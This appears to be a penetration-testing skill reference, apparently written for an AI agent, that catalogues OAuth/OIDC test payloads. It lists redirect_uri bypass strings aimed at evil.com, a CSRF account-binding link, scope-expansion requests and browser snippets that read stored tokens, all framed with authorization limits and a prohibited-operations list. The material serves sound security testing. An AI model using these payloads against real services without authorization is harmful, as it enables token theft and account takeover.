# OAuth/OIDC Security Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized penetration testing reference** only, helping identify OAuth/OIDC vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual token theft is prohibited
> - OAuth payloads are for understanding attack surface only, **no credential capture**
> - Validation proves vulnerability existence (redirect_uri flaw), **no token interception executed**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test redirect_uri, state parameter, and token handling**

---

## Validation Objectives (Within Security Boundary)

OAuth/OIDC vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| redirect_uri Validation | ✓ Test URL manipulation | - | Capture real tokens |
| State Parameter Check | ✓ Verify state presence | - | CSRF token capture |
| Scope Validation | ✓ Test scope expansion | - | Access extended permissions |
| Token Storage Check | ✓ Analyze token location | - | Use captured tokens |
| OpenID Discovery | ✓ Check /.well-known | - | Access real user data |

**Safe Validation Method**: Use Collaborator/DNSLog as redirect_uri to prove flaw exists; do not capture real user tokens.

---

## OAuth Flow Overview

```
1. Authorization Request
   GET /authorize?
     client_id=XXX&
     redirect_uri=https://app.com/callback&
     response_type=code&
     scope=openid profile&
     state=RANDOM

2. User Consent -> Redirect to callback
   https://app.com/callback?code=AUTH_CODE&state=RANDOM

3. Token Exchange (server-side)
   POST /token
     code=AUTH_CODE&
     client_id=XXX&
     client_secret=SECRET&
     redirect_uri=https://app.com/callback

4. Access Token Received
   { access_token: "XXX", refresh_token: "YYY" }
```

---

## redirect_uri Attacks

### Basic redirect_uri Manipulation

```bash
# Test if redirect_uri validation is strict
/oauth/authorize?
  client_id=CLIENT_ID&
  redirect_uri=https://YOUR_COLLABORATOR/oauth-test&
  response_type=code

# If redirect goes to Collaborator -> redirect_uri not validated
```

### Bypass Techniques

```bash
# Subdomain bypass
redirect_uri=https://trusted.com.evil.com

# Path bypass (partial match)
redirect_uri=https://trusted.com/callback/../evil.com
redirect_uri=https://trusted.com/callback%2F..%2Fevil.com

# Parameter injection
redirect_uri=https://trusted.com/callback?url=https://evil.com
redirect_uri=https://trusted.com/callback?next=https://evil.com

# Fragment bypass
redirect_uri=https://trusted.com/callback#@evil.com

# Null byte bypass
redirect_uri=https://trusted.com%00.evil.com

# Encoded bypass
redirect_uri=https://trusted.com%2Fevil.com

# Regex bypass (prefix match)
redirect_uri=https://trusted.com.evil.com
redirect_uri=https://trusted.com@evil.com

# Multiple redirect_uri
redirect_uri=https://trusted.com/callback
redirect_uri=https://evil.com  # Try parameter pollution
```

---

## State Parameter CSRF

### Check State Parameter

```bash
# Normal request with state
/oauth/authorize?client_id=XXX&redirect_uri=YYY&state=ABC123

# Test without state
/oauth/authorize?client_id=XXX&redirect_uri=YYY

# If accepted without state -> CSRF possible
```

### ⚠️ CSRF Attack Demo (Requires Authorization)

```text
# Construct CSRF link that victim clicks
https://app.com/oauth/callback?code=ATTACKER_CODE&state=FAKE

# This would bind attacker's account to victim's session
# Requires authorization before constructing attack proof
```

---

## Scope Manipulation

### Scope Expansion

```bash
# Request minimal scope
/oauth/authorize?client_id=XXX&scope=openid

# Try expanded scope
/oauth/authorize?client_id=XXX&scope=openid profile email admin

# If expanded scope granted without consent -> scope flaw
```

### Scope Downgrade

```bash
# Request in authorization
scope=openid profile

# Modify in token exchange
POST /token
  code=XXX&
  scope=openid  # Reduced scope

# If token still has profile scope -> scope downgrade fails (good)
```

---

## Token Handling Issues

### Token in URL Fragment

```text
# Implicit flow (response_type=token)
/callback#access_token=XXX

# Token in fragment can be accessed by JavaScript
# Check if page has XSS -> token theft possible
```

### Token in Query Parameter

```text
# Bad practice: token in query
/callback?access_token=XXX

# Token visible in browser history, logs
# Check if application logs query parameters
```

### Token Exposed to Third Party

```bash
# Check if token passed to external resources
# After receiving token, analyze:
- JavaScript loaded from external CDN
- Images/fonts from external domains
- API calls to external services

# Token may be leaked via Referer header
```

---

## OpenID Connect Specific

### Discovery Document

```bash
# Check OpenID discovery
GET /.well-known/openid-configuration

# Analyze:
- supported_scopes
- response_types_supported
- claim_types_supported
```

### UserInfo Endpoint

```bash
GET /userinfo?access_token=TOKEN

# Check returned claims:
- Are extra claims returned beyond scope?
- Is email verified without consent?
```

### ID Token Validation

```text
# ID Token structure (JWT)
HEADER.PAYLOAD.SIGNATURE

# Check:
- aud (audience) matches client_id
- iss (issuer) matches provider
- exp (expiration) is valid
- at_hash matches access_token
```

---

## Client-Side Token Storage

### Storage Location Check

```javascript
// After OAuth callback, check token storage:

// localStorage
localStorage.getItem('access_token')
localStorage.getItem('token')

// sessionStorage
sessionStorage.getItem('access_token')

// Cookies
document.cookie

// Check if tokens stored without encryption/protection
```

---

## PKCE (Proof Key for Code Exchange)

### Check if PKCE Used

```bash
# PKCE parameters
/oauth/authorize?
  code_challenge=HASH&
  code_challenge_method=S256

# Token exchange
POST /token
  code_verifier=ORIGINAL_STRING

# If no PKCE -> authorization code interception possible
```

---

## Analysis Process

1. Identify OAuth/OIDC endpoints from discovery phase
2. Get client_id from application (login page, config, JavaScript)
3. Test redirect_uri validation with Collaborator URL
4. Check state parameter presence and validation
5. Analyze token response type (code vs token)
6. Check token storage location in browser
7. **Stop validation**, document OAuth flaws found
8. Do not capture real user tokens or access real user data

---

## Output

```markdown
## Vulnerability: OAuth redirect_uri Misconfiguration

### Location
{OAuth Provider} - /oauth/authorize

### Vulnerability Type
{redirect_uri Bypass / State CSRF / Scope Issue}

### Proof Payload
redirect_uri=https://YOUR_COLLABORATOR/oauth-test

### Validation Result
- redirect_uri accepted: ✓ Yes (unvalidated)
- Collaborator callback received: ✓ Yes
- State parameter: {present/missing}

### Risk Level
{see severity rules}

### Severity Classification

OAuth exploit chain closure requires multiple conditions combined: redirect_uri controllable + state missing/predictable + code/token actually returned to attacker. **Single defect does not constitute high risk — must confirm token actually disclosed or account takeover chain closure is required for High.**

| Actual case | Severity | Note |
|---------|------|------|
| redirect_uri controllable + state missing, and collaborator callback actually received code/token | **High** | token theft chain closure |
| redirect_uri controllable but state exists (CSRF protection on)| Medium | Controllable but exploitation limited, requires bypassing state |
| state missing but redirect_uri not controllable | Medium | Single defect, cannot directly steal token |
| redirect_uri partially controllable (subdomain/path bypass) but callback success not confirmed | Low | Pending confirmation whether bypass actually works |
| Only identified OAuth flow exists with flawed configuration, no controllable point | Low | Pending confirmation |

**Boundary**: OAuth token theft involves real account takeover, is Tier 2 (requires user authorization). Within default scope verify whether redirect_uri is accepted / whether state exists — but "callback received code/token = High" requires confirmation with test account within authorized scope. Do not report Critical based on "redirect_uri seems injectable".
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Capture real tokens | Do not intercept actual user authorization codes/tokens |
| ❌ Account binding CSRF | Do not execute CSRF to bind attacker accounts |
| ❌ Token reuse | Do not use captured tokens to access user data |
| ❌ Impersonation | Do not authenticate as victim using stolen tokens |
| ❌ Scope abuse | Do not abuse expanded scope to access real data |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "Authenticated testing | Ask first"